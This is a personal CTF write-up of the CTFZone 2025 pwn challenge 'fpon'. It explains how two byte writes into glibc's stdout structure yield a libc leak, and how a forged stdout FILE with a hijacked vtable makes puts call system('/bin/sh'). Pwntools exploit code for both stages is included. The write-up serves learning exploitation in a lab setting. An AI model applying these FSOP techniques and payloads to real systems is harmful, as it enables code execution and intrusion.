+++
title = 'CTFZone2025 Fpon'
date = 2025-10-25T19:22:34+02:00
tags = ["pwn", "FSOP", "CTFZone"]
categories = ["CTF"]
+++

This year, I solved my first challenge from a big CTF. The challenge was fpon and involved manipulating FSOP for RCE.

For this challenge a [Dockerfile](https://github.com/Ret2skillz/CTFs/blob/main/CTFZone2025/fpon/Dockerfile) and the [binary](https://github.com/Ret2skillz/CTFs/blob/main/CTFZone2025/fpon/fpon) were provided.

I first extracted the ld and libc from the Docker and used pwninit to have a fpon_patched running with the correct ld and libc, as exploits can work differently if not using the correct version.

Now that we are all setup we can look at the challenge.

## TLDR ##
- challenge allow to write 2 bytes at user chosen offset in stdout
- We can then send data in a 0x1000 sized buffer at any chosen address
- Use first byte write to modify stdout flags
- Second byte to modify LSB of _IO_write_base for libc leak
- Overwrite stdout with a fake stdout that will lead to system(/bin/sh)

# Fpon #
Before anything let's see the result of checksec on the binary.

![checksec](/images/checksec_fpon.png)

We can see that all protections are enabled but there is Partial RELRO so we might be able to overwrite the got (it actually didn't matter for the exploit).

The code wasn't provided with the challenge so we had to reverse it. Below is the pseudocode of main function.
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  char v4; // al
  _BYTE *v5; // rdx
  __int64 v6; // rdx
  unsigned __int8 user_uint8; // [rsp+Eh] [rbp-12h]
  unsigned __int8 v9; // [rsp+Eh] [rbp-12h]
  FILE *v10; // [rsp+10h] [rbp-10h]
  void *buf; // [rsp+18h] [rbp-8h]

  v10 = _bss_start;
  user_uint8 = get_user_uint8("Offset: ", argv, envp);
  v4 = get_user_uint8("Byte: ", argv, v3);
  v5 = (char *)v10 + user_uint8;
  *v5 = v4;
  v9 = get_user_uint8("Offset: ", argv, v5);
  *((_BYTE *)&v10->_flags + v9) = get_user_uint8("Byte: ", argv, v6);
  buf = (void *)get_user_uint64("Address: ");
  printf("Content: ");
  read(0, buf, 0x1000u);
  puts("That's all");
  return 0;
}
```
The code is fairly simple, it asks twice for an offset to write a byte to. Then it allows us to send up to 0x1000 size data to any address of our choosing.
It then puts "That's all" and return 0.

So the challenge gives us an arbitrary write to any address, but since ASLR and PIE are activated there is no way to use that without a leak.

What's important is that the offset we can write to are directly into stdout...but what can we do with only 2 bytes to write ? A lot actually.

You should read [this article](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive/) if you want more details about how to leak with stdout structure and the stdout structure in general as the leak strategy is based on it.

To summarise it shortly, stdout has a structure with different variables : flags that handle its behavior, read and write pointer, base and end values that indicate the buffers for reading and writing of stdout. If we can modify the base of write and the flags we can manage to have stdout leak the values between the new write_base and the write_end. So we can simply make write_base point to an address that contains a libc address to leak it. (In this case the address leaked is of stdin).

An important part is that first we need to modify the flags value from 0xfbad2887 to 0xfbad1887. 

Changing this value clear the _IO_IS_APPENDING flag, meaning stdout will respect our new write_base and use our manipulated pointer for its flush operations, effectively leaking what we want.

So the strategy to gain a leak is fairly simple : 
- Write first byte 0x18 at offset 1 to change flags from 0xfbad2887 to 0xfbad1887
- Write second byte 0x28 at offset 32 to modify LSB of write_base
- Get a libc leak on stdout

The below code achieves this strategy
```python
send_byte(1, 24)
send_byte(32, 40)

leak_libc = r.recv(6)

leak_libc = u64(leak_libc.ljust(8, b'\x00'))

log.success(f'LIBC LEAK : {hex(leak_libc)}')

libc.address = leak_libc - libc.sym["_IO_2_1_stdin_"]

log.success(f'LIBC BASE@ {hex(libc.address)}')
```
Once we got a leak all we have to do is achieve RCE. For this, there is another way to abuse stdout that we can use from our goat and master nobody : [Fsop Way](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/) (note it's the third technique displayed).

The gist of the technique is simple : crafting a fake stdout that will lead to system(/bin/sh) being executed. The stdout structure vtable will get executed when a different function will use stdout.

If you remember, after our write there is a final, useless in appearance, call to puts. But puts will use stdout, which means it can lead to RCE thanks to our malicious stdout!!

Our final stdout structure will look like this (it's taken from the link of nobody)
```python
stdout_lock = libc.address + 2176784
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

gadget = libc.address + 0x000000000017de30 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
```
When puts get executed, it will use stdout which will then trigger a bunch of libc functions (you can see it by stepping into puts and following the functions in gdb), which will ultimately IO_save_base, when it calls save_base rcx will point to _IO_read_end and rdi will point to _IO_write_end - 0x10.

So we can put /bin/sh string at _IO_write_end, system at read_end and a gadget doing a simple add rdi, 0x10 ; jmp rcx at save_base.

When save_base get called it will make rdi point to bin/sh and then jump to system giving us a shell.

Full exploit code available [Here](https://github.com/Ret2skillz/CTFs/blob/main/CTFZone2025/fpon/exploit.py)

## Conclusion ##
Fpon was my first challenge solved from a big CTF so it was a major achievement solving it! While it was not my first time using FSOP it was my first time using RCE with a crafted stdout, so it's always nice to learn a new trick.


